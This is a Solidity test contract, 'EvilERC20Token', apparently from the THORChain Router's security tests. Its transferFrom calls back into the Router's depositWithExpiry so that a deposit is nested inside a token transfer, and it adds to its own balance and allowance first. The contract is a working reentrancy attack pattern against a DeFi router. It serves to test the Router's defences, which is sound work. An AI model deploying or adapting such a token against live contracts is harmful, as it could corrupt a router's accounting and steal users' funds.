// SPDX-License-Identifier: MIT

/**
 * ATTACK DESCRIPTION:
 * This contract attempts to exploit the THORChain Router through a nested transaction attack:
 * 1. During the transferFrom function, it checks if this is the first transaction (!second)
 * 2. If it is, it sets 'second' to true and attempts to call the Router's deposit function
 *    within the transferFrom operation
 * 3. This creates a nested/recursive transaction flow which can confuse accounting and state tracking
 * 4. The attack tests if the Router properly handles tokens that attempt to call back into the Router
 *    during what should be a simple token transfer operation
 */
pragma solidity 0.8.30;

interface iROUTER {
    function depositWithExpiry(address, address, uint, string calldata, uint) external;
}

//IERC20 Interface
interface iERC20  {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address, uint) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address, uint) external returns (bool);
    function transferFrom(address, address, uint) external returns (bool);
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

// Token Contract
contract EvilERC20Token is iERC20 {

    using SafeMath for uint256;

    // Coin Defaults
    string public name;                                         // Name of Coin
    string public symbol;                                       // Symbol of Coin
    uint256 public decimals  = 18;                              // Decimals
    uint256 public override totalSupply  = 1*10**6 * (10 ** decimals);   // 1,000,000 Total
    bool public second;
    uint256 public attemptCount = 0;  // Track recursion depth

    // Mapping
    mapping(address => uint256) public override balanceOf;                          // Map balanceOf
    mapping(address => mapping(address => uint256)) public override allowance;    // Map allowances
    
    // Events
    event Approval(address indexed owner, address indexed spender, uint value); // ERC20
    event Transfer(address indexed from, address indexed to, uint256 value);    // ERC20

    // Minting event
    constructor() {
        balanceOf[msg.sender] = totalSupply;
        name = "Token";
        symbol  = "TKN";
        second = false; // Explicitly initialize to false
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    
    // ERC20
    function transfer(address to, uint256 value) public override returns (bool success) {
        _transfer(msg.sender, to, value);
        return true;
    }

    // ERC20
    function approve(address spender, uint256 value) public override returns (bool success) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    // ERC20
    function transferFrom(address from, address to, uint256 value) public override returns (bool success) {
        // Increment attempt count to track recursion depth
        attemptCount++;

        // On first transfer, do a nested/second deposit, but stop after that to avoid an infinite loop
        if (!second && attemptCount <= 1) {
          second = true;
          balanceOf[address(this)] += value;
          allowance[address(this)][to] += value;
          iROUTER(to).depositWithExpiry(from, address(this), value, "", type(uint).max);
        }
        require(value <= allowance[from][msg.sender], "allowance error");
        allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);
        _transfer(from, to, value);
        return true;
    }

    // Transfer function 
    function _transfer(address _from, address _to, uint _value) internal {
        require(_to != address(0), "address error");
        require(balanceOf[_from] >= _value, "balance error");
        require(balanceOf[_to].add(_value) >= balanceOf[_to], "balance error");                 // catch overflow       
        balanceOf[_from] = balanceOf[_from].sub(_value);                       // Subtract from sender         
        balanceOf[_to] = balanceOf[_to].add(_value);                            // Add to receiver
        emit Transfer(_from, _to, _value);                                  // Transaction event            
    }

    function burn(uint256 amount) public virtual {
        _burn(msg.sender, amount);
    } 

    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");
        balanceOf[account] = balanceOf[account].sub(amount, "ERC20: burn amount exceeds balance");
        totalSupply = totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

}